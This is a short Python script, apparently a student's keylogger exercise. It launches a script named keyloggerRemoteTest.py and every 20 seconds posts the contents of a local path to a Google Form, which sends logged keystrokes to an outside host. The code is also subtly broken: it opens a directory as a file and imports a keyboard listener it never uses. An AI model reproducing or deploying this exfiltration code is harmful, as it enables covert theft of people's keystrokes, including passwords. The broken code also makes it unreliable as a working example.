#!/usr/bin/python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py")
time.sleep(1)

def send_request():
        form_input = open("/home/student/Desktop/scripts")
        form_send = form_input.read()
        url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0'
        form_data = {'entry.2005620554': f"'{form_send}'"}
        r = requests.post(url, data=form_data)

def interval():
        global startlog
        if time.time() - 20 > startlog:
                print('Its been 20 secs')
                send_request()
                startlog = time.time()

counter = 0
while True:
        counter += 1
        print(counter)
        interval()
        time.sleep(1)

